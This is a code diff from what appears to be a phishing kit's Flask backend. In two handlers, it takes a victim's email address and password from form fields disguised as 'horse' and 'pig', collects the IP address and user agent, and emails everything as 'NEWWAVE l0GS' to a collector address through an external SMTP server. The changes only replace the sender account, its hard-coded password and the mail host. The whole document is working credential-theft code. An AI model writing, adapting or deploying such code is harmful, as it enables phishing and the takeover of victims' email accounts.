@@ -145,9 +145,9 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "newallbussiness@newupdateishere.com"
+        sender_email = "change@bseng2i.com"
         receiver_email = "gwan12@rfrniso.com"
-        password = "]NkevAZbUe]S"
+        password = "o;&5N]nkTv]M"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEWWAVE l0GS ! 1"
@@ -163,7 +163,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.newupdateishere.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.bseng2i.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -182,9 +182,9 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "newallbussiness@newupdateishere.com"
+        sender_email = "change@bseng2i.com"
         receiver_email = "gwan12@rfrniso.com"
-        password = "]NkevAZbUe]S"
+        password = "o;&5N]nkTv]M"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEWWAVE l0GS !! 2"
@@ -200,7 +200,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.newupdateishere.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.bseng2i.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
